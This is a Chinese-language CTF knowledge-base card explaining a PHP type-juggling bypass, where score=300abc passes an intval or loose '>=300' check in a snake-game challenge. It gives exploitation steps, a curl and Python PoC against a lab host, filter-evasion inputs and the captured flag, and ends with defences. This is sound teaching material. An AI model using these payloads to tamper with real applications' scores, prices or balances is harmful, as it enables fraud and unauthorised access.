---
id: web-php-loose-numeric-prefix-score-bypass
title: PHP 数值前缀/宽松比较绕过：score=300abc 通过 >=300 校验
type: scenario
domain: web
path: web/php
technique: php-loose-numeric-prefix-score-bypass
tags:
- php
- type-juggling
- loose-comparison
- intval
- business-logic
- ctf
cve: []
severity: medium
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-06'
verification:
  verified_by: verifier-V111
  verified_at: '2026-11-06T01:46:34+08:00'
  notes: 已对照 WEBSnakeGame 原文核对：score=300/300abc/300.1 进成功分支、299abc 失败、返回 flag 与原文一致；文章未给出后端源码，宽松比较/intval 为合理推断；PoC 未本机执行
url: /docs/web/php/web-php-loose-numeric-prefix-score-bypass/
draft: false
kb_aliases:
- PHP 宽松比较
- intval 前缀
- score=300abc
- 数值前缀绕过
- WEBSnakeGame
---

## 一句话结论

当后端用 `intval($score) >= 300` 或 PHP 宽松数值比较判断游戏分数、而不是严格校验完整数字时，提交 `score=300abc`（或 `300`、`300.1`）即可让数值前缀达到 300 进入成功分支，无需真的玩到 300 分。

## 原理

- **数值前缀解析**：PHP 的 `intval("300abc")` 返回 `300`（解析到第一个非数字为止），`floatval("300.1")` 返回 `300.1`；如果后端用 `intval`/`(int)` 转换后再比较，`300abc` 会被当作 300。
- **宽松比较**：PHP 的 `==`/`>=` 在字符串与数字之间会做类型转换；某些版本/写法下 `"300abc" >= 300` 可能为真（取决于是否被判定为 numeric string），而 `299abc` 为假。题目实测 `300abc`、`300.1` 通过，`299abc` 失败。
- **业务逻辑缺陷**：分数本应由服务端游戏逻辑计算/签名，客户端提交的 `score` 被直接信任；即使做了“>=300”判断，也只校验了下界，没有校验类型/范围/来源。
- **为什么成立**：攻击者控制 POST 的 `score` 字符串；后端把字符串转数值/宽松比较，前缀 300 即满足条件，后缀 `abc` 不影响。
- **边界**：若后端使用 `is_numeric` + 严格 `===`/`filter_var(FILTER_VALIDATE_INT)`，`300abc` 会被拒绝；若分数有签名/服务端记录，需改其他参数。

## 触发条件

- 前端把 `score` 作为表单字段提交到后端，后端直接用它判断奖励/flag。
- 后端使用 `intval`/`(int)`/`floatval` 或 PHP 宽松比较，未严格校验完整数字。
- 成功条件是一个数值阈值（如 >=300），且没有服务端签名/会话记录。
- 攻击者能直接发包/改包。

## 利用步骤

1. 抓取游戏结束提交请求，确认字段名（本题 `score`）与 Content-Type。
2. 提交 `score=300abc` 或 `score=300.1`，观察是否进入成功分支；用 `299abc` 作对照。
3. 若成功，响应返回 flag；本题 `flag{d64789df977417240841c25834f4d77f}`。
4. 若被过滤，尝试 `300%00`、`300 `、`0x12c`、`3e2`、数组 `score[]=300`、JSON 数字/字符串混用。
5. 用脚本批量尝试候选并正则提取 `flag{...}`。

## PoC

```bash
curl -s -X POST -d "score=300abc" "http://target:22569/index.php"
# {"status":"success","message":"Congratulations!","flag":"flag{...}"}
```

```python
import re, urllib.parse, urllib.request

URL = "http://target:22569/index.php"
def try_score(score):
    data = urllib.parse.urlencode({"score": score}).encode()
    req = urllib.request.Request(URL, data=data, headers={"Content-Type": "application/x-www-form-urlencoded"})
    text = urllib.request.urlopen(req, timeout=10).read().decode("utf-8", "ignore")
    m = re.search(r"flag\{[^}]+\}", text)
    return m.group(0) if m else text

for s in ("300abc", "300", "300.1"):
    print(s, try_score(s))
```

## 变体与关联

- **变体（类型）**：`intval`、`floatval`、`(int)`、`==`/`>=` 宽松比较、`in_array` 非严格、`array_search`。
- **变体（输入）**：`300abc`、`300.1`、`3e2`、`0x12c`、`0300`、`300%00`、数组/JSON 类型混淆。
- **变体（业务）**：价格/余额/数量/积分阈值；核心是“客户端可控数值 + 不严格校验”。
- **关联卡片**：[[web-php-deserialization-phar-gif8-stub-inner-php-suffix-bypass]]（PHP 类型/后缀绕过）、[[web-generic-ssti-waf-string-concat-eq-globals-bypass]]（PHP/Python 弱类型/字符串绕过）、[[web-php-rce-yii-menu-href-expression-eval-disable-functions-bypass]]（PHP 业务逻辑注入）。
- **边界**：严格类型/白名单/签名会阻止；服务端若重新计算分数则无效。

## 检测与防御

- **严格校验**：用 `filter_var($score, FILTER_VALIDATE_INT)` 并检查范围；不要用 `intval`/宽松比较做安全判断。
- **服务端权威**：分数由服务端游戏逻辑计算/签名，客户端只提交操作；奖励阈值用服务端记录。
- **检测**：审计 `intval`/`(int)`/`==` 与用户输入组合；监控非纯数字的 score/price 参数。
